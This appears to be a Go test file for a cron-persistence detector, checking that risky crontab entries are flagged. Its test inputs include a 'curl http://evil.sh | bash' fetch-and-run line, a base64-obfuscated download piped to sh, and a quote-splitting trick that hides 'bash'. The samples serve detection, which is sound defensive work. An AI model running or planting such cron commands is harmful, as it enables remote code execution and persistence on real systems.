package persistence

import (
	"strings"
	"testing"
)

func TestCronRisk_BasicToken(t *testing.T) {
	risk, tok := cronRisk(normalizeCronLine("* * * * * root curl -s http://evil.sh | bash"))
	if !risk {
		t.Fatal("expected risk")
	}
	if tok == "" {
		t.Fatal("expected non-empty token")
	}
}

func TestCronRisk_Base64DecodeReveal(t *testing.T) {
	// The line has no direct "bash" token, but base64 decodes to curl http://evil.
	encoded := "Y3VybCBodHRwOi8vZXZpbA==" // curl http://evil
	line := "0 * * * * root echo " + encoded + " | base64 -d | sh"
	if risk, _ := cronRisk(normalizeCronLine(line)); !risk {
		t.Fatal("expected base64 decoded payload to flag risk")
	}
}

func TestCronRisk_QuoteTricksNormalized(t *testing.T) {
	line := `* * * * * root 'ba''sh' -c "echo hi"`
	n := normalizeCronLine(line)
	if !strings.Contains(n, "bash -c") {
		t.Fatalf("expected collapsed quotes to reveal bash -c, got %q", n)
	}
}

func TestCollectCronTargets_HandlesMissingPaths(t *testing.T) {
	// Just make sure the helper doesn't panic on a non-Linux dev machine.
	_ = collectCronTargets()
}
